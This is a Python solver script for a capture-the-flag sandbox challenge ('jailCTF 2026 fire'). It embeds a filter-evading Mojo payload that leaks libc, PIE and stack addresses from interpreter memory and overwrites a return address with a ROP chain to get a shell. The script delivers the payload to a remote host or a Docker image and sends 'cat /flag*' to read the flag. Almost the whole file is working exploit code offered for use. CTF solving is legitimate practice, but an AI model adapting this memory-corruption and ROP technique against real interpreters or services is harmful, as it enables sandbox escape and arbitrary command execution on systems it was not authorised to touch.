#!/usr/bin/env python3
import argparse
import os
import re
import socket
import ssl
import subprocess
import tempfile
import time

PAYLOAD = r'''def main():
    comptime char_p = UnsafePointer[UInt8, MutUntrackedOrigin]
    var memory: char_p = __mlir_attr[`#interp.pointer<0> : `, char_p._mlir_type]

    var str = "abc"

    var lo, hi = 0, 1 << 60
    while hi - lo > 1:
        var mid = lo + hi >> 1
        if memory + mid > str._ptr_or_data:
            hi = mid
        else:
            lo = mid

    var ltext_ptr = memory + lo
    var interesting_addrs: List[UInt64] = []

    for _ in [0] * 0x300:
        var leaked_addr: UInt64 = 0
        for i in [7, 6, 5, 4, 3, 2, 1, 0]:
            leaked_addr <<= 8
            var byte = ltext_ptr[i]
            while byte != 0:
                byte -= 1
                leaked_addr += 1

        if leaked_addr >= 0x700000000000 and leaked_addr < 0x800000000000:
            interesting_addrs += [leaked_addr]
        ltext_ptr += 8

    var max_leak_addr: UInt64 = 0
    for addr in interesting_addrs:
        if addr > max_leak_addr and addr & 0xfff == 0x960:
            max_leak_addr = addr

    var libc_base = max_leak_addr - 0x104960

    var pie_leak_ptr = memory + libc_base + 0x1e7848
    var pie_leak: UInt64 = 0
    for i in [7, 6, 5, 4, 3, 2, 1, 0]:
        pie_leak <<= 8
        var byte = pie_leak_ptr[i]
        while byte != 0:
            byte -= 1
            pie_leak += 1

    var pie_base = pie_leak - 0x546a770

    var stack_leak_ptr = memory + libc_base + 0x1e6378
    var stack_leak: UInt64 = 0
    for i in [7, 6, 5, 4, 3, 2, 1, 0]:
        stack_leak <<= 8
        var byte = stack_leak_ptr[i]
        while byte != 0:
            byte -= 1
            stack_leak += 1

    stack_leak &= -8
    var stack_ptr = memory + stack_leak
    var return_addr = pie_base + 0x3e9dac7

    for _ in [0] * 0x1000:
        var leaked_addr: UInt64 = 0
        for i in [7, 6, 5, 4, 3, 2, 1, 0]:
            leaked_addr <<= 8
            var byte = stack_ptr[i]
            while byte != 0:
                byte -= 1
                leaked_addr += 1

        if leaked_addr == return_addr:
            break

        stack_ptr -= 8

    var rop_chain: List[UInt64] = [
        libc_base + 0x2a146,
        libc_base + 0x2a145,
        libc_base + 0x1a5ea4,
        libc_base + 0x53110,
    ]

    var index = 0
    for var addr in rop_chain:
        for _ in [0] * 8:
            var byte = addr & 0xff
            stack_ptr[index] = 0
            while byte != 0:
                byte -= 1
                stack_ptr[index] += 1
            addr >>= 8
            index += 1
'''

FLAG_RE = re.compile(rb"jail\{[^}\r\n]+\}")


def validate_payload() -> None:
    if PAYLOAD.count("(") != 1 or "{" in PAYLOAD:
        raise RuntimeError("payload no longer satisfies the jail filter")


def extract_flag(data: bytes):
    m = FLAG_RE.search(data)
    return m.group(0).decode() if m else None


def solve_remote(host: str, port: int, use_ssl: bool, timeout: float) -> str:
    raw = socket.create_connection((host, port), timeout=10)
    if use_ssl:
        ctx = ssl.create_default_context()
        raw = ctx.wrap_socket(raw, server_hostname=host)

    raw.settimeout(0.5)
    raw.sendall(PAYLOAD.encode() + b"EOF\n")

    buf = bytearray()
    start = time.monotonic()
    next_cmd = start + 1.0

    while time.monotonic() - start < timeout:
        now = time.monotonic()
        if now >= next_cmd:
            try:
                raw.sendall(b"cat /flag*\n")
            except OSError:
                pass
            next_cmd = now + 1.0

        try:
            chunk = raw.recv(65536)
            if not chunk:
                flag = extract_flag(bytes(buf))
                if flag:
                    return flag
                break
            buf += chunk
            flag = extract_flag(bytes(buf))
            if flag:
                return flag
        except socket.timeout:
            continue
        except OSError:
            break

    flag = extract_flag(bytes(buf))
    if flag:
        return flag
    raise RuntimeError("flag not recovered before timeout; last output:\n" + bytes(buf[-4000:]).decode(errors="replace"))


def solve_local_image(image: str, timeout: float) -> str:
    with tempfile.NamedTemporaryFile("w", suffix=".mojo", delete=False) as f:
        f.write(PAYLOAD)
        path = f.name

    try:
        cmd = [
            "docker", "run", "-i", "--rm",
            "-v", f"{path}:/srv/tmp/exp.mojo:ro",
            "-v", "/dev:/srv/dev",
            "--entrypoint", "/bin/sh",
            image,
            "-c",
            "LD_LIBRARY_PATH=/usr/local/lib/python3.14/site-packages/modular/lib "
            "chroot /srv /usr/local/bin/mojo /tmp/exp.mojo",
        ]
        p = subprocess.run(
            cmd,
            input=b"cat /flag*\nexit\n",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout,
        )
        data = p.stdout + b"\n" + p.stderr
        flag = extract_flag(data)
        if flag:
            return flag
        raise RuntimeError(
            f"local exploit did not recover a flag (exit={p.returncode})\n"
            + data[-5000:].decode(errors="replace")
        )
    finally:
        try:
            os.unlink(path)
        except OSError:
            pass


def main() -> None:
    ap = argparse.ArgumentParser(description="jailCTF 2026 fire solver")
    ap.add_argument("host", nargs="?")
    ap.add_argument("port", nargs="?", type=int)
    ap.add_argument("--ssl", action="store_true", help="wrap remote socket in TLS")
    ap.add_argument("--timeout", type=float, default=120.0)
    ap.add_argument("--local-image", metavar="IMAGE", help="test against an already-built challenge image")
    args = ap.parse_args()

    validate_payload()

    if args.local_image:
        flag = solve_local_image(args.local_image, args.timeout)
    else:
        if not args.host or args.port is None:
            ap.error("provide HOST PORT, or use --local-image IMAGE")
        flag = solve_remote(args.host, args.port, args.ssl, args.timeout)

    print(flag)


if __name__ == "__main__":
    main()
